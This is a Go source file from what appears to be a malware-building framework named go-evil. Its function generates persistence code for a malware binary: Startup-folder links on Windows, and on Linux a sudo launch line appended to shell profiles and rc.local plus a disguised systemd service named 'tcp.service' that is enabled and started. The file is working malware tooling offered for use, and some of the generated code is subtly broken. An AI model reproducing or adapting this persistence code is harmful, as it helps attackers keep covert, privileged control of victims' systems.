package system

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/utility/structure"
)

// Add the malware to startup
func Add_to_startup(s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "Add_startup"

	body := []string{fmt.Sprintf("func %s(){", function_call)}

	if data_object.Target_os == "windows" {
		body = append(body, "malware_path, _ := spine.path",
			"os.Link(malware_path, \"%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\")",
			"os.Link(malware_path, \"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\")")

	} else {
		body = append(body,
			"malware_path, _ := os.Executable()",

			"for _, line := range []string{\"/etc/profile\", \"~/.bash_profile\", \"~/.bash_login\", \"~/.profile\", \"/etc/rc.local\"} {",
			"in, err := os.OpenFile(line, os.O_APPEND|os.O_WRONLY, 0644)",
			"if err != nil {",
			"spine.log(err.Error())",
			"return",
			"}",
			"in.WriteString(\"sudo .\" + malware_path + \" &\")",
			"}",

			"in, err := os.Create(\"/lib/systemd/system/tcp.service\")",
			"if err != nil {",
			"spine.log(err.Error())",
			"return",
			"}",

			"write := bufio.NewWriter(in)",
			"what_to_write := []string{",
			"\"[Unit]\",",
			"\"Description=My Sample Service\",",
			"\"After=multi-user.target\",",

			"\"[Service]\",",
			"\"Type=idle\",",
			"fmt.Sprintf(\"ExecStart=%s\", spine.path),",

			"\"[Install]\",",
			"\"WantedBy=multi-user.target\",",
			"}",
			"for _, line := range what_to_write {",
			"write.WriteString(line)",
			"}",
			"exec.Command(\"sudo\", \"systemctl\", \"enable\", \"tcp.service\").Run()",
			"exec.Command(\"sudo\", \"systemctl\", \"start\", \"tcp.service\").Run()")

		data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")
	}

	body = append(body, "}")
	data_object.Add_go_function(body)

	data_object.Add_go_import("os/exec")
	data_object.Add_go_import("bufio")
	data_object.Add_go_import("os")

	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
}
